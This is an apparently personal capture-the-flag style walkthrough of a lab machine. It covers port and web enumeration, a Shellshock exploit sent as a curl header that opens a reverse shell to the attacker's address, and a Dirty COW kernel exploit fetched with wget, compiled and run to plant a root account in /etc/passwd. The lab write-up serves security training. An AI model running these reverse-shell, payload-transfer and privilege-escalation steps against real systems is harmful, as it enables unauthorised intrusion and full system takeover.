# Enumerate

Looking for targets on subnet. Found 

192.168.162.87

##Nmap

Adding -O for OS detection in the field

sudo nmap -sT -sV -sC -O --open -p- 192.168.162.87 -oN sumo.scan

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 13:06 GMT

Nmap scan report for 192.168.162.87

Host is up (0.045s latency).

Not shown: 64132 closed tcp ports (conn-refused), 1401 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT   STATE SERVICE VERSION 

22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   1024 06cb9ea3aff01048c417934a2c45d948 (DSA)

|   2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)

|_  256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)

80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))

|_http-title: Site doesn't have a title (text/html).

|_http-server-header: Apache/2.2.22 (Ubuntu)

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.93%E=4%D=6/15%OT=22%CT=1%CU=32838%PV=Y%DS=4%DC=I%G=Y%TM=648B0CE

OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%II=I%TS=8)OPS(O1=M

OS:551ST11NW5%O2=M551ST11NW5%O3=M551NNT11NW5%O4=M551ST11NW5%O5=M551ST11NW5%

OS:O6=M551ST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(R=Y%

OS:DF=Y%T=40%W=3908%O=M551NNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=

OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)

OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=EE

OS:DD%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

  

Network Distance: 4 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 38.19 seconds

  

##Http

Due to not wanting to miss anything I'll run autorecon on targets at the start.

gobuster dir -u http://192.168.162.87:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================

Gobuster v3.5

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url:                     http://192.168.162.87:80

[+] Method:                  GET

[+] Threads:                 10

[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

[+] Negative Status codes:   404

[+] User Agent:              gobuster/3.5

[+] Timeout:                 10s

===============================================================

2023/06/15 13:10:11 Starting gobuster in directory enumeration mode

===============================================================

/index                (Status: 200) [Size: 177]

/server-status        (Status: 403) [Size: 295]

Progress: 137038 / 220561 (62.13%)^C

Takes forever. I thought go was fast.

dirb http://192.168.162.87                                                                            13:15:28

  

-----------------

DIRB v2.22    

By The Dark Raver

-----------------

  

START_TIME: Thu Jun 15 13:15:52 2023

URL_BASE: http://192.168.162.87/

WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

  

-----------------

  

GENERATED WORDS: 4612                                                          

  

---- Scanning URL: http://192.168.162.87/ ----

+ http://192.168.162.87/cgi-bin/ (CODE:403|SIZE:290)                                                              

+ http://192.168.162.87/index (CODE:200|SIZE:177)                                                                 

+ http://192.168.162.87/index.html (CODE:200|SIZE:177)                                                            

+ http://192.168.162.87/server-status (CODE:403|SIZE:295)                                                         

-----------------

END_TIME: Thu Jun 15 13:19:51 2023

DOWNLOADED: 4612 - FOUND: 4

requires double commands to further search the directories. I need recursive scanning

dirbuster                                                                                             13:17:50

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

Starting dir/file list based brute forcing

Dir found: / - 200

Dir found: /cgi-bin/ - 403

Dir found: /icons/ - 403

Dir found: /doc/ - 403

Dir found: /cgi-bin/test/ - 200

Dir found: /icons/small/ - 403

Way easier + GUI + thread changes

  

It seems autorecon + dirbuster is the best most thorough method in case I get super mentally low on resources.

  

view-source:[http://192.168.162.87/cgi-bin/test/](http://192.168.162.87/cgi-bin/test/)

CGI Default !

So it looks like shellshock

[https://www.youtube.com/watch?v=aKShnpOXqn0](https://www.youtube.com/watch?v=aKShnpOXqn0)

  

Confirm with nikto

nikto -h 192.168.162.87

-h = Host

  

nikto -h 192.168.162.87                                                                               13:26:09

  

- Nikto v2.5.0

---------------------------------------------------------------------------

+ Target IP:          192.168.162.87

+ Target Hostname:    192.168.162.87

+ Target Port:        80

+ Start Time:         2023-06-15 13:33:23 (GMT0)

---------------------------------------------------------------------------

+ Server: Apache/2.2.22 (Ubuntu)

+ /: Server may leak inodes via ETags, header found with file /, inode: 1706318, size: 177, mtime: Mon May 11 17:55:10 2020. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418

+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/

+ /index: Uncommon header 'tcn' found, with contents: list.

+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275

+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.

+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .

+ /cgi-bin/test: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.

+ /cgi-bin/test: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

+ /cgi-bin/test.sh: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.

+ /cgi-bin/test.sh: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278

  
  
  

#Weaponize

Need to set up a listener

nc -nlvp 4444

  

and check my ip for the rev shell code

ip addr | grep tun0                                                                                   13:43:58

9: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500

    inet 192.168.45.153/24 scope global tun0

  

Shellshock manual exploitation code. Remember to switch to double quotes for less problems.

curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.153/4444 0>&1" [http://192.168.162.87/cgi-bin/test.sh](http://192.168.124.87/cgi-bin/test.sh)

AI explainer

In the context of the Shellshock exploit, () { :; }; is the beginning of a function definition in Bash. However, the purpose of this particular function is not to perform any useful tasks, but rather to exploit the vulnerability in Bash.

  

Here's a more detailed explanation of each component:

1.     (): This defines the start of a function declaration in Bash.
    
2.     { :; }: Within the function, the colon (:) is a placeholder for an empty command. The semicolon (;) separates commands within the function. In this case, the function has an empty command, which means it doesn't perform any real action. Its purpose is to deceive Bash into thinking that it has a valid function definition.
    

  

The combination of () { :; }; tricks the vulnerable Bash shell into accepting the rest of the payload as valid code.

  

The rest of the payload after the function definition (/bin/bash -i >& /dev/tcp/192.168.45.254/4444 0>&1) is the actual command that is executed within the context of the exploited Bash shell.

  

This payload attempts to open a reverse shell connection to the IP address 192.168.45.254 on port 4444. It redirects the input and output streams to establish a network connection between the target system and the attacker's system.

  

#Exploit

Ran revshell code

listening on [any] 4444 ...

connect to [192.168.45.153] from (UNKNOWN) [192.168.162.87] 47955

bash: no job control in this shell

www-data@ubuntu:/usr/lib/cgi-bin$ ls

ls

local.txt

test

test.sh

www-data@ubuntu:/usr/lib/cgi-bin$ cat local.txt 

cat local.txt

28985bf955d856cd86936d2127a24c49

I'm in

  

#Escalate

www-data@ubuntu:/usr/lib/cgi-bin$ uname -a

uname -a

Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l

  

sudo -l

sudo: no tty present and no askpass program specified

Sorry, try again.

sudo: no tty present and no askpass program specified

Sorry, try again.

sudo: no tty present and no askpass program specified

Sorry, try again.

sudo: 3 incorrect password attempts

That usually works...

  

www-data@ubuntu:/usr/lib/cgi-bin$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

<i-bin$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null            

-rwsr-xr-x 1 root root 36832 Apr  8  2012 /bin/su

-rwsr-xr-x 1 root root 94792 Mar 29  2012 /bin/mount

-rwsr-xr-x 1 root root 35712 Nov  8  2011 /bin/ping

-rwsr-xr-x 1 root root 40256 Nov  8  2011 /bin/ping6

-rwsr-xr-x 1 root root 69096 Mar 29  2012 /bin/umount

-rwsr-xr-x 1 root root 31304 Mar  2  2012 /bin/fusermount

-rwsr-xr-x 1 root root 18912 Nov  8  2011 /usr/bin/traceroute6.iputils

-rwsr-xr-x 1 root root 42824 Apr  8  2012 /usr/bin/passwd

-rwsr-xr-x 1 root root 63848 Apr  8  2012 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 32352 Apr  8  2012 /usr/bin/newgrp

-rwsr-xr-x 1 root root 41832 Apr  8  2012 /usr/bin/chfn

-rwsr-xr-x 1 root root 62400 Jul 28  2011 /usr/bin/mtr

-rwsr-xr-x 2 root root 71248 Jan 31  2012 /usr/bin/sudoedit

-rwsr-xr-x 2 root root 71248 Jan 31  2012 /usr/bin/sudo

-rwsr-sr-x 1 daemon daemon 47928 Oct 25  2011 /usr/bin/at

-rwsr-xr-x 1 root root 37096 Apr  8  2012 /usr/bin/chsh

-rwsr-sr-x 1 libuuid libuuid 18856 Mar 29  2012 /usr/sbin/uuidd

-rwsr-xr-- 1 root dip 325744 Feb  4  2011 /usr/sbin/pppd

-rwsr-xr-x 1 root root 10408 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device

-r-sr-xr-x 1 root root 13628 May 11  2020 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper

-r-sr-xr-x 1 root root 14320 May 11  2020 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

-rwsr-xr-- 1 root messagebus 292944 Feb 22  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 240984 Aug 11  2016 /usr/lib/openssh/ssh-keysign

Lots of programs to run through.

  

Suggestion to start looking for kernel exploits.

searchsploit ubuntu 3.2.0-23                                                                                                                   13:54:37

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

 Exploit Title                                                                                                            |  Path

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation (1)                      | linux/local/18411.c

Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)    | linux_x86-64/local/33589.c

Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                      | linux/dos/43234.c

Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation                                   | linux_x86-64/local/34134.c

Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation                         | linux_x86-64/local/44299.c

Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                             | linux/local/45010.c

Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                    | linux/local/44298.c

Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                         | linux_x86-64/local/44300.c

Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                     | linux/local/43418.c

Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) | linux/local/47169.c

Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                    | linux/local/41760.txt

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

 Paper Title                                                                                                              |  Path

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Debian < 5.0.6 / Ubuntu < 10.04 - Webshell Remote Root Exploit                                                            | english/15311-debian--5.0.6--ubu

-------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Only two had the exact version number in it. Starting from the top and going down to try the privesc is the way to go.

Getting payload info

searchsploit -p 33589                                                                                                                          13:55:55

  Exploit: Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3)

      URL: https://www.exploit-db.com/exploits/33589

     Path: /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c

    Codes: CVE-2013-2094, OSVDB-93361

 Verified: True

File Type: C source, ASCII text

  

cp /usr/share/exploitdb/exploits/linux_x86-64/local/33589.c 33589.c

Exploit page for more info [https://www.exploit-db.com/exploits/33589](https://www.exploit-db.com/exploits/33589) so will need to run it locally on the target. Need to set up a file server to transfer over the exploit

  
(IP address changed due to the target box dying)

  

python -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

192.168.178.87 - - [15/Jun/2023 14:06:50] "GET /33589.c HTTP/1.1" 200 -

  

Now on target make sure you go to a folder with writer privileges which would be tmp

www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp

cd /tmp

www-data@ubuntu:/tmp$ wget http://192.168.45.176:8000/33589.c

wget http://192.168.45.176:8000/33589.c

--2023-06-15 07:12:50--  http://192.168.45.176:8000/33589.c

Connecting to 192.168.45.176:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 3525 (3.4K) [text/x-csrc]

Saving to: `33589.c'

  

     0K ...                                                   100% 7.46M=0s

  

2023-06-15 07:12:50 (7.46 MB/s) - `33589.c' saved [3525/3525]

  

www-data@ubuntu:/tmp$ ls

ls

33589.c

  

gcc 33589.c -O2 -o ./exploit 

  

    -O2 is Uppercase O and the number 2

    -o for the output file and we provide the required location and file name.

    I’ve encountered the following error:

    gcc: error trying to exec 'cc1': execvp: No such file or directory

    Quick Google search revels we’re not the first to encounter this issue and a quick fix is to run the following command which adds the gcc required PATH:

    export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

    Re-run the gcc command and now there’s no output, which means, in our case, the command finished with no errors. Quick ls command reveals the new executable (called “exploit”):

  

AI Explainer

The error message "gcc: error trying to exec 'cc1': execvp: No such file or directory" means that the GCC compiler cannot find the 'cc1' executable. To fix this, you can add the directory containing 'cc1' to the system's PATH environment variable. The command "export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH" does this by modifying the PATH variable to include the necessary directory. This ensures that when you run the 'gcc' command, the system can locate 'cc1' and the error is resolved.

  
  

Error below with fix

gcc: error trying to exec 'cc1': execvp: No such file or directory

www-data@ubuntu:/tmp$ gcc

gcc

gcc: fatal error: no input files

compilation terminated.

www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o exploit              

gcc 33589.c -O2 -o exploit

gcc: error trying to exec 'cc1': execvp: No such file or directory

www-data@ubuntu:/tmp$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o ./exploit 

gcc 33589.c -O2 -o ./exploit 

www-data@ubuntu:/tmp$ ls        

ls

33589.c

exploit

vmware-root

www-data@ubuntu:/tmp$ ./exploit

./exploit

exploit: 33589.c:73: main: Assertion `argc == 2 && "target?"' failed.

bash: [1673: 1 (255)] tcsetattr: Inappropriate ioctl for device

www-data@ubuntu:/tmp$ uname -a

uname -a

Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux

www-data@ubuntu:/tmp$ ./exploit localhost

./exploit localhost

(Breaks the shell 😞)

Will try dirty cow instead

  

wget http://192.168.45.176:8000/c0w.c

Nope

  

Trying another one

  

cp /usr/share/exploitdb/exploits/linux/local/40839.c 40839.c

gcc -pthread 40839.c -o dirty -lcrypt

  

nc -nlvp 4444                                                                                          14:38:57

listening on [any] 4444 ...

connect to [192.168.45.176] from (UNKNOWN) [192.168.178.87] 54427

bash: no job control in this shell

www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp

cd /tmp

www-data@ubuntu:/tmp$ wget http://192.168.45.176:8000/40839.c

wget http://192.168.45.176:8000/40839.c

--2023-06-15 07:42:22--  http://192.168.45.176:8000/40839.c

Connecting to 192.168.45.176:8000... connected.

HTTP request sent, awaiting response... 200 OK

Length: 4814 (4.7K) [text/x-csrc]

Saving to: `40839.c'

  

     0K ....                                                  100%  214K=0.02s

  

2023-06-15 07:42:22 (214 KB/s) - `40839.c' saved [4814/4814]

  

www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o dirty -lcrypt

gcc -pthread 40839.c -o dirty -lcrypt

gcc: error trying to exec 'cc1': execvp: No such file or directory

www-data@ubuntu:/tmp$ export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

export PATH=/usr/lib/gcc/x86_64-linux-gnu/4.6:$PATH

www-data@ubuntu:/tmp$ gcc -pthread 40839.c -o dirty -lcrypt

gcc -pthread 40839.c -o dirty -lcrypt

www-data@ubuntu:/tmp$ ./dirty

./dirty

Please enter the new password: password

/etc/passwd successfully backed up to /tmp/passwd.bak

Complete line:

firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

  

mmap: 7f1aa8b50000

ptrace 0

Done! Check /etc/passwd to see if the new user was created.

You can log in with the username 'firefart' and the password 'password'.

  

  

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

/etc/passwd successfully backed up to /tmp/passwd.bak

Complete line:

firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

  

mmap: 7f1aa8b50000

madvise 0

  

Done! Check /etc/passwd to see if the new user was created.

You can log in with the username 'firefart' and the password 'password'.

  

  

FINALLY

  

Now to ssh in

ssh firefart@192.168.178.87                                                                                                                    14:46:26

The authenticity of host '192.168.178.87 (192.168.178.87)' can't be established.

ECDSA key fingerprint is SHA256:G8HZXu6SUrixt/obia/CUlTgdJK9JaFKXwulm6uUrbQ.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '192.168.178.87' (ECDSA) to the list of known hosts.

firefart@192.168.178.87's password: 

Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com/

New release '14.04.6 LTS' available.

Run 'do-release-upgrade' to upgrade to it.

  

firefart@ubuntu:~# whoami

firefart

firefart@ubuntu:~# cd /root

firefart@ubuntu:~# ls

proof.txt  root.txt

firefart@ubuntu:~# cat root.txt 

Your flag is in another file...

firefart@ubuntu:~# cat proof.txt 

3a19f5383da2f8d0fd8d6b86b3544c2d

Boot2Root